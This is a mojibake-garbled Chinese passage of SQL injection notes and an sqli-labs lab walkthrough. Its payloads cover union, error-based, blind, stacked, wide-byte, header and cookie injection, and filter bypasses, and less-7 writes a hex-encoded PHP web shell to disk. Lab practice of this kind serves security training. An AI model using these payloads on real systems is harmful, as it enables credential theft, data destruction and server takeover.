GeometryCollection((select * from (select * from(select user())a)b))\n- polygon((select * from(select * from(select user())a)b))\n- multipoint((select * from(select * from(select user())a)b))\n- multilinestring((select * from(select * from(select user())a)b))\n- LINESTRING((select * from(select * from(select user())a)b))\n- multipolygon((select * from(select * from(select user())a)b))\nå…¶ä¸­éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒåŸºäºexpå‡½æ•°çš„æŠ¥é”™æ³¨å…¥åœ¨MySQL 5.5.49åçš„ç‰ˆæœ¬å·²ç»ä¸å†ç”Ÿæ•ˆï¼Œå…·ä½“å¯ä»¥å‚è€ƒè¿™ä¸ª commit 95825f ã€‚\nè€Œä»¥ä¸Šåˆ—è¡¨ä¸­åŸºäºgeometricçš„æŠ¥é”™æ³¨å…¥åœ¨è¿™ä¸ª commit 5caea4 ä¸­è¢«ä¿®å¤ï¼Œåœ¨5.5.xè¾ƒåçš„ç‰ˆæœ¬ä¸­åŒæ ·ä¸å†ç”Ÿæ•ˆã€‚\n\n```\n\n## å †å æ³¨å…¥\n- åŸç†\n  \n\n    åœ¨ SQL ä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡ sql è¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ; ç»“æŸä¸€ä¸ª sql è¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œ union injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äº union æˆ–è€… union all æ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ ä»»æ„çš„è¯­å¥ã€‚ ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ª\n\n- ä¾‹å­\n  \n    ç”¨æˆ·è¾“å…¥ï¼š 1; DELETE FROM products æœåŠ¡å™¨ç«¯ç”Ÿæˆçš„ sql è¯­å¥ä¸ºï¼šï¼ˆå› æœªå¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼‰ Select * from products where productid=1;DELETE FROM products å½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤ã€‚\n\n\n## å®½å­—èŠ‚æ³¨å…¥\n\n    mysql åœ¨ä½¿ç”¨ GBK ç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦ä¸ºä¸€ä¸ªæ±‰å­—ï¼Œä¾‹å¦‚%aa%5c å°±æ˜¯ä¸€ä¸ª æ±‰å­—ï¼ˆå‰ä¸€ä¸ª ascii ç å¤§äº 128 æ‰èƒ½åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰ã€‚\n    æˆ‘ä»¬åœ¨è¿‡æ»¤ â€™ çš„æ—¶å€™ï¼Œå¾€å¾€åˆ©ç”¨çš„æ€ è·¯æ˜¯å°† â€˜ è½¬æ¢ä¸º \\â€™ ï¼ˆè½¬æ¢çš„å‡½æ•°æˆ–è€…æ€è·¯ä¼šåœ¨æ¯ä¸€å…³é‡åˆ°çš„æ—¶å€™ä»‹ç»ï¼‰ã€‚ \n    å› æ­¤æˆ‘ä»¬åœ¨æ­¤æƒ³åŠæ³•å°† â€˜ å‰é¢æ·»åŠ çš„ \\ é™¤æ‰ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ€è·¯ï¼š 1ã€%df åƒæ‰ \\ å…·ä½“çš„åŸå› æ˜¯ urlencode(â€˜\\) = %5c%27ï¼Œæˆ‘ä»¬åœ¨%5c%27 å‰é¢æ·»åŠ %dfï¼Œå½¢ æˆ%df%5c%27ï¼Œè€Œä¸Šé¢æåˆ°çš„ mysql åœ¨ GBK ç¼–ç æ–¹å¼çš„æ—¶å€™ä¼šå°†ä¸¤ä¸ªå­—èŠ‚å½“åšä¸€ä¸ªæ±‰å­—ï¼Œæ­¤ äº‹%df%5c å°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œ%27 åˆ™ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ç¬¦å·åœ¨å¤–é¢ï¼ŒåŒæ—¶ä¹Ÿå°±è¾¾åˆ°äº†æˆ‘ä»¬çš„ç›®çš„ã€‚ 2ã€å°† \\â€™ ä¸­çš„ \\ è¿‡æ»¤æ‰ï¼Œä¾‹å¦‚å¯ä»¥æ„é€  %**%5c%5c%27 çš„æƒ…å†µï¼Œåé¢çš„%5c ä¼šè¢«å‰é¢çš„%5c ç»™æ³¨é‡Šæ‰ã€‚è¿™ä¹Ÿæ˜¯ bypass çš„ä¸€ç§æ–¹æ³•ã€‚\n\n\n## æ³¨é‡Šç¬¦\n- --+\n- /*xxx*/\n- /*!xxx*/\n- /*!50000xxx*/\n\n\n## åˆ¤æ–­è¿‡æ»¤è§„åˆ™\n- æ˜¯å¦æœ‰trunc\n- æ˜¯å¦è¿‡æ»¤æŸä¸ªå­—ç¬¦\n- æ˜¯å¦è¿‡æ»¤å…³é”®å­—\n- slashå’Œç¼–ç \n\n## è·å–ä¿¡æ¯\n- åˆ¤æ–­æ•°æ®åº“ç±»å‹\n    - and exists (select * from msysobjects ) > 0 accessæ•°æ®åº“\n    - and exists (select * from sysobjects ) > 0 SQLServeræ•°æ®åº“\n- åˆ¤æ–­æ•°æ®åº“è¡¨\n    - and exsits (select * from admin)\n- ç‰ˆæœ¬ã€ä¸»æœºåã€ç”¨æˆ·åã€åº“å\n- è¡¨å’Œå­—æ®µ\n    - ç¡®å®šå­—æ®µæ•°\n        - Order By \n        - Select Into\n    - è¡¨åã€åˆ—å\n    \n## æµ‹è¯•æƒé™\n- æ–‡ä»¶æ“ä½œ\n- è¯»æ•æ„Ÿæ–‡ä»¶\n- å†™shell \n- å¸¦å¤–é€šé“\n- ç½‘ç»œè¯·æ±‚\n\n[åŸæ–‡](https://websec.readthedocs.io/zh/latest/vuln/sql/fuzz.html)\n\n# sqli-labs\n\n## less-1\n    åŸºäºé”™è¯¯çš„å­—ç¬¦ä¸²/æ•°å­—æ³¨å…¥\n\nåˆ¤æ–­æ³¨å…¥ç‚¹ä¸ºæ•°å­—æ³¨å…¥\n```\n?id= -1\n```\n\nä¾æ¬¡çŒœè§£å­—æ®µæ•°ä¸º3\n```bash\n?id= 1' order by  3 --+\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151345546.png?token=ARYCSAQAJQKU4EFI7DF2DP3CQCJ2A)\n\n\nè”åˆæ„é€ å›æ˜¾ä½,-1æ˜¯è®©å‰é¢ä¸ºå‡\n```bash\n?id= -1' union select 1,2,3 --+ \n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151351875.png?token=ARYCSATQIWNB74JBLB7W6H3CQCKTO)\n\né€šè¿‡å›æ˜¾ä½æŸ¥è¯¢ç”¨æˆ·åå’Œæ•°æ®åº“å\n```bash\n?id=-1' union select 1,user(),database() --+ \n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151350693.png?token=ARYCSAS2JY6N73XIVIQGAULCQCKP4)\n\næŸ¥è¯¢æ‰€æœ‰åº“å\n```bash\n?id=-1' union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+\n\ngroup_concat åˆ†ç»„\nschema_name å­˜å‚¨æ‰€æœ‰åº“ä¿¡æ¯çš„ä¸€ä¸ªå­—æ®µ\ninformation_schema å­˜å‚¨æ‰€æœ‰åº“ä¿¡æ¯çš„ä¸€ä¸ªåº“\ninformation_schema.schemata å­˜å‚¨æ‰€æœ‰åº“åçš„ä¸€ä¸ªè¡¨ \n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151352288.png?token=ARYCSASN6T4ZWRHELOIJ4DTCQCKV2)\n\n\næŸ¥è¯¢securityæ•°æ®åº“çš„æ‰€æœ‰è¡¨å\n```bash\n?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 'security') ,3 --+ \n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151352713.png?token=ARYCSARJLSPH7D5CDHU7C7TCQCKXE)\n\næŸ¥è¯¢usersè¡¨çš„æ‰€æœ‰åˆ—\n```bash\n?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name = 'users') ,3 --+ \n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151353521.png?token=ARYCSAWGBVK5Z2MZAZKQ2UTCQCKY6)\n\næŸ¥è¯¢ç”¨æˆ·åå’Œå¯†ç \n```bash\n?id=-1' union select 1,(select group_concat(username) from security.users) ,(select group_concat(password) from security.users) --+ \n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151353047.png?token=ARYCSAV4ZAU7YIEL2K2WS2LCQCK2G)\n## less-2\n\nåŒ less1,æ˜¯æ•°å€¼å‹æ³¨å…¥ä¸éœ€è¦é—­åˆ\n```bash\n?id=-1 union select 1,(select group_concat(username) from security.users) ,(select group_concat(password) from security.users) \n```\n\n## less-3\næºç \n```php\n$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n```\n\néœ€è¦æ„é€ é—­åˆ `')`\n```bash\n?id=-1') UNION SELECT 1,(select group_concat(username) from security.users ),database() --+\n```\n\n## less-4\næºç \n```php\n$id = '\"' . $id . '\"';\n$sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\";\n$result=mysql_query($sql);\n```\n\nç”± `\"`å¼•èµ·çš„æ³¨å…¥,æ„é€ é—­åˆ `\")`\n\n```bash\n?id=-1\") UNION SELECT 1,(select group_concat(username) from security.users ),database() --+\n```\n\n## less-5\næºç  \n```php\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n\tif($row)\n\t{\n  \techo '<font size=\"5\" color=\"#FFFF00\">';\t\n  \techo 'You are in...........';\n  \techo \"<br>\";\n    \techo \"</font>\";\n  \t}\n```\n\nç”± `'` å¼•èµ·æ³¨å…¥,ä½†æ˜¯æ— å›æ˜¾\n\n- updatexml \n    - MySQL 5.1.5ç‰ˆæœ¬ä»¥ä¸Šæ‰æ”¯æŒè¯¥å‡½æ•°\n    - è¿”å›çš„æ•°æ®é™åˆ¶ä¸º32ä½,å¯ä»¥ç”¨substringå‡½æ•°è¿›è¡Œæ•°æ®ä½ç§»åè½¬\n    - å¯¹XMLæ–‡æ¡£è¿›è¡Œä¿®æ”¹\n    - UPDATEXML (XML_document, XPath_string, new_value);\n    - ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°\n    - ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²)\n    - ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®\n    - ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼\n- å†™æ³•\n```bash\n  select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));\n```\n\n- å®ä¾‹\n```bash\n?id=1'  and (updatexml(1,concat(0x7e,(select substring(group_concat(password),1)from users),0x7e),1))--+\n```\n\n## less-6\næºç \n```php\n$id = '\"'.$id.'\"';\n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\n$result=mysql_query($sql);\n```\n\næ­¤å¤„ä½¿ç”¨ `\"` é—­åˆ,æ­£ç¡®è¿”å›Use outfile,é”™è¯¯è¿”å›You have an error in your SQL syntax\n\n\n## less-7\næºç \n```php\n$sql=\"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n\n\tif($row)\n\t{\n  \techo '<font color= \"#FFFF00\">';\t\n  \techo 'You are in.... Use outfile......';\n  \techo \"<br>\";\n  \techo \"</font>\";\n  \t}\n\telse \n\t{\n\techo '<font color= \"#FFFF00\">';\n\techo 'You have an error in your SQL syntax';\n\t//print_r(mysql_error());\n\techo \"</font>\";  \n\t}\n```\n\nä¾æ—§æ²¡æœ‰å›æ˜¾,é—­åˆç¬¦å·æ¢æˆ `'))`,ä½¿ç”¨`into outfile`å†™å…¥shell\n\n```bash\n?id=-1')) union select 1,0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e,3 into outfile \"/var/www/html/Less-7/shell.php\"--+\n```\n\n## less-8\næºç \n```php\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n        if($row)\n        {\n        echo 'You are in...........';\n        }\n        else\n        {\n\n        echo '<font size=\"5\" color=\"#FFFF00\">';\n        //echo 'You are in...........';\n        //print_r(mysql_error());\n        //echo \"You have an error in your SQL syntax\";\n        echo \"</br></font>\";\n        echo '<font color= \"#0000ff\" font size= 3>';\n\n        }\n```\n\nåŸºäºå¸ƒå°”çš„ç›²æ³¨,ç”± `'` å¼•èµ·çš„æ³¨å…¥,æ­£ç¡®å›æ˜¾You are in...,é”™è¯¯æ— å›æ˜¾\n\n- åˆ¤æ–­æ•°æ®åº“é•¿åº¦\n\n```bash\n  ?id=1' and (length(database())) = 8 --+ #æ•°åº“åé•¿åº¦=8\n```\n\n- é€ä¸€çŒœè§£åº“å\n\n```bash\n?id=1' and (ascii(substr((select database()) ,1,1))) = 115--+\nåˆ¤æ–­åº“åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ç­‰äºasciiç çš„115ä¹Ÿå°±æ˜¯s,ç­‰äºè¿”å›æ­£ç¡®é¡µé¢,ä¸ç­‰äºè¿”å›é”™è¯¯é¡µé¢\n```\n```bash\né€ä¸€çŒœè§£...\n?id=1' and (ascii(substr((select database()) ,2,1))) = 101 --+\n```\n\n- åˆ¤æ–­è¡¨é•¿åº¦\n```bash\n?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 5 --+\n```\n\n- çŒœè§£è¡¨å\n```bash\n?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,1,1))) = 117 --+\né€ä¸€çŒœè§£...\n```\n\n## less-9\næºç \n```php\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n\n\tif($row)\n\t{\n  \techo 'You are in...........';\n  \t}\n\telse \n\t{\n\techo 'You are in...........';\n\t}\n```\nåŸºäºæ—¶é—´çš„ç›²æ³¨,ç”± `'` å¼•èµ·çš„æ³¨å…¥,ä½†æ˜¯æ­£ç¡®å’Œé”™è¯¯éƒ½å›æ˜¾ä¸€æ ·\n\n- åˆ¤æ–­æ³¨å…¥\n```bash\n?id=1'+and+if(1=1, sleep(5), null)+ --+\n```\n\n- åˆ¤æ–­åº“åé•¿åº¦\n```bash\n?id=1' + and (length(database())) =8 + and + if(1=1,sleep(5),null) + --+\n```\n\n- é€ä¸€çŒœè§£è¡¨å\n```bash\n?id=1' + and (ascii(substr(database(),1,1))) = 115 + and + if(1=1,sleep(3),null) + --+\n```\n\n## less-10\næºç \n```php\n$id = '\"'.$id.'\"';\n$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n```\n\nå’Œless-9ä¸€æ ·åªæ˜¯é—­åˆç¬¦å·æ¢æˆ `\"`\n\n## less-11\næºç \n```php\n\t@$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\";\n\t$result=mysql_query($sql);\n\t$row = mysql_fetch_array($result);\n\tif($row)\n\t{\n\t\techo 'Your Login name:'. $row['username'];\n\t\techo 'Your Password:' .$row['password'];\n  \t}\n\telse  \n\t{\n\t\tprint_r(mysql_error());\n\t}\n```\nPOSTæ³¨å…¥ç”± `'` å¼•èµ·,æ³¨å…¥è¯­å¥ç”±postæäº¤\n\n- ä¸‡èƒ½ç™»å½•\n```bash\nuname=admin' or '1'='1' #&passwd=1\n```\n\n- åˆ¤æ–­æ•°åˆ—\n```bash\nuname=admin' order by 2 #&passwd=1\n```\n\n- çŒœè§£åº“å\n```bash\nuname=-admin' union select 1,(select group_concat(schema_name) from information_schema.schemata)##&passwd=1 \n```\n- åé¢ä¾æ¬¡çŒœè§£\n\n## less-12\næºç \n```php\n\t$uname='\"'.$uname.'\"';\n\t$passwd='\"'.$passwd.'\"'; \n\t@$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\";\n\t$result=mysql_query($sql);\n\t$row = mysql_fetch_array($result);\n```\nå’Œless-11ä¸€æ ·åªæ˜¯é—­åˆç¬¦å·æ¢æˆ `\")`\n\n- çŒœè§£åº“å\n```bash\nuname=-admin\") union select 1,(select group_concat(schema_name) from information_schema.schemata)##&passwd=1 \n```\n\n## less-13\næºç \n```php\n @$sql=\"SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1\";\n        $result=mysql_query($sql);\n        $row = mysql_fetch_array($result);\n```\nç”± `')` å¼•èµ·çš„æ³¨å…¥,é”™è¯¯æœ‰å›æ˜¾,æ­£ç¡®æ— å›æ˜¾\n\n- payload \n```bash\nuname=1') and (updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1))#&passwd=1\n```\n\n## less-14\næºç  \n\n```php\n$uname='\"'.$uname.'\"';\n\t$passwd='\"'.$passwd.'\"'; \n\t@$sql=\"SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1\";\n\t$result=mysql_query($sql);\n\t$row = mysql_fetch_array($result);\n```\nä¸less-13ä¸€è‡´,é—­åˆç¬¦å·æ¢æˆ`\"`\n\n-payload\n```bash\nuname=1\" and (updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1))#&passwd=1\n```\n\n## less-15\næºç \n```php\n$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\";\n        $result=mysql_query($sql);\n        $row = mysql_fetch_array($result);\n```\nåŸºäºæ—¶é—´çš„POSTç›²æ³¨,æ— å›æ˜¾ ç”±`'`å¼•èµ·\n\n- payload\n```bash\nuname=1' or if(length(database())= 8,sleep(3),null) #&passwd=1\n```\n\n- ä¾æ¬¡çŒœè§£\n\n\n## less-16\næºç \n```php\n\t$uname='\"'.$uname.'\"';\n\t$passwd='\"'.$passwd.'\"'; \n\t@$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\";\n\t$result=mysql_query($sql);\n\t$row = mysql_fetch_array($result);\n```\n\nä¸less-15ä¸€è‡´,é—­åˆç¬¦å·æ¢æˆ `\")`\n\n## less-17\næºç \n```php\n@$sql=\"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1\";\n$result=mysql_query($sql);\n$row = mysql_fetch_array($result);\n        if($row)\n        {\n                $row1 = $row['username'];\n                $update=\"UPDATE users SET password = '$passwd' WHERE username='$row1'\";\n                mysql_query($update);\n                }\n```\n\nupdateæŠ¥é”™æ³¨å…¥,å¯¹passwdå‚æ•°æ³¨å…¥\n- payload\n```bash\nuname=admin & passwd=123' or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) #\n```\n\n- sqlmapæ³¨å…¥\n  ```bash\n  sqlmap -u \"http://127.0.0.1/sqlilabs2/Less-17/\" --data \"uname=admin&passwd=woshiadmin&submit=Submit\" -p passwd --dbms mysql --threads 10 --method POST --flush-session --fresh-queries --level 1 --risk 1 --technique E --dbs\n  ```\n    - data:æŒ‡å®šè¯·æ±‚ä¿¡æ¯\n    - p:æŒ‡å®šå‚æ•°\n    - dbms:æŒ‡å®šåç«¯æ•°æ®åº“\n    - threads:æŒ‡å®šå¹¶å‘çº¿ç¨‹æ•°\n    - method:æŒ‡å®šè¯·æ±‚æ–¹å¼\n    - flush-session:æ¸…é™¤session\n    - fresh-queries:å‘èµ·æ–°çš„è¯·æ±‚\n    - level 1:å°è¯•POSTå’ŒGETæ³¨å…¥\n    - risk 1:ä»…æµ‹è¯•å¸¸è§ç”¨ä¾‹\n    - technique E:ä»…æµ‹è¯•æŠ¥é”™æ³¨å…¥æ–¹å¼\n    \n\n## less-18\næºç \n```php\n\t$sql=\"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\";\n\t$result1 = mysql_query($sql);\n\t$row1 = mysql_fetch_array($result1);\n```\n\næŠ“åŒ…å¯¹uaè¿›è¡Œæ³¨å…¥\n- payload\n```bash\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0)' and (updatexml(1,concat(0x7e,user(),0x7e),1)) and '1' = '1\n```\n\n## less-19\nå¯¹Refererè¿›è¡Œæ³¨å…¥,å‚æ•°ä¸€è‡´\n\n## less-20\nå¯¹cookieè¿›è¡Œæ³¨å…¥,å‚æ•°ä¸€è‡´\n\n## less-21\nå¯¹cookieè¿›è¡Œæ³¨å…¥,éœ€è¦ç”¨base64ç¼–ç å¯¹æ³¨å…¥cookieç¼–ç \n\n- payload\n```bash\nCookie: uname=YWRtaW4nIGFuZCAodXBkYXRleG1sKDEsY29uY2F0KDB4N2UsdXNlcigpLDB4N2UpLDEpKSBhbmQgJzEnID0gJzE=%3d\n```\n\n## less-22\nåŒä¸Šé—­åˆä¸º `\"`\n\n## less-23\næ³¨é‡Šç¬¦è¢«è¿‡æ»¤\n\n- payload\n```bash\n?id=-1' union select 1,(select group_concat(username,password ) from users),3  or  '1' = '1\n```\n\n## less-24\näºŒæ¬¡æ³¨å…¥\nåœ¨æ’å…¥usernameçš„å°±ç›´æ¥æŠŠæ³¨å…¥çš„payloadæ’åˆ°æ•°æ®åº“é‡Œï¼Œå–å‡ºæ¥æ—¶å€™é€ æˆæ³¨å…¥\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151353507.png?token=ARYCSAQA54RALIR36KQEMBLCQCK3I)\n\nç™»å½•äº†admin' or 1=1#è¿™ä¸ªè´¦å· è¾“å…¥æ–°å¯†ç admin\nupdateçš„æ—¶å€™å°±æŠŠåŸå…ˆçš„admin' or 1=1 #å–å‡ºæ¥æ‹¿åˆ°è¯­å¥ä¸­äº†,æ‰€ä»¥å¯†ç éƒ½æ˜¯adminäº†ã€‚\n\n## less-25 \nç»•è¿‡ç³»åˆ—\n\nåŒå†™ç»•è¿‡\n- payload\n```bash\n?id=1' anandd 1=1 --+\n```\n```bash\n?id=-1' union select 1,database(),3 --+\n```\n\n## less-25a \næ²¡æœ‰å•å¼•å·é—­åˆ\n\n- payload\n```bash\n?id=1 anandd 1=1 --+\n```\n```bash\n?id=-1 union select 1,database() ,3--+\n```\n\n## less-26\nå•å¼•å·é—­åˆ è¿‡æ»¤äº† orï¼Œand ï¼Œ /* , â€“ , # , ç©ºæ ¼ , /\n\n- payload\n```bash\n?id=1'%26%26extractvalue(null,concat(0x7e,(select(group_concat(username,'~',passwoorrd))from(security.users)),0x7e))oorr'\n```\n\n## less-26a\nåŠ äº†ä¸ª)é—­åˆ\n\n- payload\n```bash\n?id=1111')union%A0select(1),(select(group_concat(id,'~',username,'~',passwoorrd))from(security.users)),3%7c%7c('1\n```\n\n## less-27\nåœ¨ä¸Šå…³çš„åŸºç¡€ä¸Šè¿‡æ»¤äº†unionå’Œselect\n- payload\n```bash\n?id=1'%09and%09updatexml(1,concat(0x7e,(SeleCt(group_concat(username,password))from(users)),0x7e),1)and'1\n```\n\n## less-27a\nåœ¨27çš„åŸºç¡€ä¸Šä½¿ç”¨ \"\n- payload\n```bash\nid=100\"unIon%a0SelEcT%a01,database(),3||\"1\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206221824318.png)\n\n## less-28\n\n- æºç \n```php\n $sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\n\nfunction blacklist($id)\n{\n$id= preg_replace('/[\\/\\*]/',\"\", $id);                          //strip out /*\n$id= preg_replace('/[--]/',\"\", $id);                            //Strip out --.\n$id= preg_replace('/[#]/',\"\", $id);                                     //Strip out #.\n$id= preg_replace('/[ +]/',\"\", $id);                    //Strip out spaces.\n//$id= preg_replace('/select/m',\"\", $id);                               //Strip out spaces.\n$id= preg_replace('/[ +]/',\"\", $id);                    //Strip out spaces.\n$id= preg_replace('/union\\s+select/i',\"\", $id);     //Strip out UNION & SELECT.\nreturn $id;\n}\n```\nè¿‡æ»¤union+selectå’Œç©ºæ ¼,å¯ä»¥ä½¿ç”¨åŒå†™/å¤§å°å†™,%a0ç»•è¿‡\n\n- payload\n```bash\nid=100')UNIOn%a0SELEct%a0(1),(user()),(3)||('1--+\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206221842098.png)\n\n\n## less-28a\n- æºç \n```php\n$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";\n\nfunction blacklist($id)\n{\n//$id= preg_replace('/[\\/\\*]/',\"\", $id);                                //strip out /*\n//$id= preg_replace('/[--]/',\"\", $id);                          //Strip out --.\n//$id= preg_replace('/[#]/',\"\", $id);                                   //Strip out #.\n//$id= preg_replace('/[ +]/',\"\", $id);                  //Strip out spaces.\n//$id= preg_replace('/select/m',\"\", $id);                               //Strip out spaces.\n//$id= preg_replace('/[ +]/',\"\", $id);                  //Strip out spaces.\n$id= preg_replace('/union\\s+select/i',\"\", $id);     //Strip out spaces.\nreturn $id;\n}\n```\nåœ¨ä¸Šä¸€å…³çš„åŸºç¡€ä¸Šå–æ¶ˆäº†ä¸€äº›è¿‡æ»¤\n\n- payload\n```bash\n?id=0')%A0UNION%A0SELECT%A0(1),(user()),(3)||('1--+\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206221848033.png)\n\n## less-29\n- æºç \n```php\n// take the variables \nif(isset($_GET['id']))\n{\n        $id=$_GET['id'];\n        //logging the connection parameters to a file for analysis.\n        $fp=fopen('result.txt','a');\n        fwrite($fp,'ID:'.$id.\"\\n\");\n        fclose($fp);\n\n        $qs = $_SERVER['QUERY_STRING'];\n        $hint=$qs;\n\n// connectivity \n        $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n```\n-  waf\n```php\n//WAF implimentation with a whitelist approach..... only allows input to be Numeric.\nfunction whitelist($input)\n{\n        $match = preg_match(\"/^\\d+$/\", $input);\n        if($match)\n        {\n                //echo \"you are good\";\n                //return $match;\n        }\n        else\n        {\n                header('Location: hacked.php');\n                //echo \"you are bad\";\n        }\n}\n// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).\nfunction java_implimentation($query_string)\n{\n        $q_s = $query_string;\n        $qs_array= explode(\"&\",$q_s);\n\n\n        foreach($qs_array as $key => $value)\n        {\n                $val=substr($value,0,2);\n                if($val==\"id\")\n                {\n                        $id_value=substr($value,3,30);\n                        return $id_value;\n                        echo \"<br>\";\n                        break;\n                }\n\n        }\n\n}\n```\n- payload\n```bash\n?id=0' union select 1,user(),3--+\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206231633275.png)\n\n\n## less-30\n- æºç \n```php\n $sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";\n```\nåœ¨ä¸Šä¸€å…³çš„åŸºç¡€ä¸Šä½¿ç”¨\"é—­åˆ\n\n- payload\n```bash\n?id=-1\" union select 1,user(),3--+\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206231639100.png)\n\n## less-31\n- æºç \n```php\n$sql=\"SELECT * FROM users WHERE id= ($id) LIMIT 0,1\";\n```\nåœ¨30å…³çš„åŸºç¡€ä¸Šæ·»åŠ ()\n\n- payload\n```bash\n?id=0\") union select 1,user(),3||(\"--+\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206231642976.png)\n\n## less-32\nå®½å­—èŠ‚æ³¨å…¥ \n- æºç \n```php\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n\n\nfunction check_addslashes($string)\n{\n    $string = preg_replace('/'. preg_quote('\\\\') .'/', \"\\\\\\\\\\\\\", $string);          //escape any backslash\n    $string = preg_replace('/\\'/i', '\\\\\\'', $string);                               //escape single quote with a backslash\n    $string = preg_replace('/\\\"/', \"\\\\\\\"\", $string);                                //escape double quote with a backslash\n\n\n    return $string;\n}\n```\nè¿‡æ»¤å•åŒå¼•å·å’Œ\\,\\\\\n\n- payload\n```bash\n?id=0%df%27union select 1,user(),3--+\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206231656178.png)\n\n\n## less-33\nåŒä¸Š\n\n## less-34\n- æºç \n```php\n@$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 